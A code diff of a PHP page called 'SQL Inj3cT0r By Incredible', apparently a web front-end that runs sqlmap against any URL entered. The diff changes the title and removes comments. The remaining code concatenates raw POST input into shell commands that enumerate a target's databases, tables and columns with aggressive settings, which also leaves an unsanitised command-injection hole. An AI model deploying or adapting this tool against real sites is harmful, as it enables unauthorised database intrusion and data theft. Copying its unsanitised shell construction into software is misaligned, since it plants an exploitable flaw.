@@ -11,7 +11,7 @@ if(isset($_POST['ss']))
 <html>
 <head>
 </script>
-<title>--==[[SQL InjecT0r By Incredible]]==--</title>
+<title>--==[[SQL Inj3cT0r By Incredible]]==--</title>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
 <STYLE>
@@ -207,13 +207,11 @@ Type SQL Injection vulnerable URL in b0X given Below <br><br><br>
 
 
 <?php
-
-  //ye value 0 set kerne ke baad script ka execution hota rahega jab tak sqlmap processing khatam na ker le
 if(isset($_POST['btn']))
 {
 	
 	
-$url=$_POST['udata'];//$url variable is saving url value
+$url=$_POST['udata'];
 $x=" python ".$_SESSION['sqlmap']." -u  ".$url."  --batch --dbs" ;
 //die();
 ?>
@@ -237,7 +235,7 @@ result has been printed and you can proceed to further exploitation
 
 if(isset($_POST['tsubmit']))
 {
-	$link=$_POST['url'];//rakhi yahaan jo bhi value h jis variable may, us variable ko form may use kerlo bas :)
+	$link=$_POST['url'];
 	$db=$_POST[db];
 	$tfinal="python ".$_SESSION['sqlmap']." -u ".$link." -D ".$db." --tables --batch";
 	?>
@@ -259,7 +257,7 @@ result showing the table names of the given database.
 if(isset($_POST['csubmit']))
 {
 	
-	$clink=$_POST['url'];//use these values in form given below chalo aapka task h ye 
+	$clink=$_POST['url']; 
 	$tbl=$_POST['tbl'];
 	$db=$_POST['dbs'];
 	$cfinal="python ".$_SESSION['sqlmap']." -u ".$clink." -D ".$db." -T " .$tbl." --columns --batch --level=3 --risk=3";
